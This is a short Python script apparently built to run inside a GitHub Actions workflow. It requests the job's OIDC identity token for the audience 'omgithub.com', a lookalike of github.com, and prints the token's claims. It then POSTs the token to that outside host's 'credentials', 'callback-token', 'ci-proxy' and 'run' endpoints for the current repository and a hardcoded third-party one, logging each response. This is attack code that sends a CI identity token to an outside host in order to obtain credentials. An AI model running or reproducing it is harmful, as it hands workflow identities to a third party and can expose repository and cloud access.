import os, json, base64, urllib.request, urllib.parse, urllib.error

ORIGIN = "https://omgithub.com"
UA = "curl/8.5.0"

def get_token(aud=None):
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    if aud:
        url += "&audience=" + urllib.parse.quote(aud, safe="")
    req = urllib.request.Request(url, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"], "User-Agent": UA})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)["value"]

def claims(t):
    p = t.split(".")[1]; p += "=" * (-len(p) % 4)
    c = json.loads(base64.urlsafe_b64decode(p))
    ks = ["iss","sub","aud","ref","repository","repository_owner","job_workflow_ref","event_name","workflow","actor","run_id","run_attempt"]
    return {k: c.get(k) for k in ks}

def req(url, tok, body):
    data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, method="POST",
        headers={"content-type":"application/json","authorization":"Bearer "+tok,"User-Agent":UA,"Accept":"application/json"})
    try:
        with urllib.request.urlopen(r, timeout=20) as x:
            return x.status, x.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')
    except Exception as e:
        return -1, repr(e)

run = os.environ.get("GITHUB_RUN_ID","1"); attempt = os.environ.get("GITHUB_RUN_ATTEMPT","1")
repo = os.environ.get("GITHUB_REPOSITORY","x/y")
tok = get_token(ORIGIN)
print("TOKEN_LEN", len(tok), flush=True)
print("CLAIMS", json.dumps(claims(tok)), flush=True)
targets = [repo+"/issues/1", "artistso/PlayGround/issues/6"]
eps = ["ci-proxy","credentials","callback-token","run"]
for tgt in targets:
    for ep in eps:
        url = "%s/api/github/%s/%s" % (ORIGIN, tgt, ep)
        st,resp = req(url, tok, {"run":run,"attempt":int(attempt),"use_auth":True})
        print("RESULT %s -> HTTP %s :: %s" % (url, st, resp[:900].replace("\n"," ")), flush=True)
print("DONE")
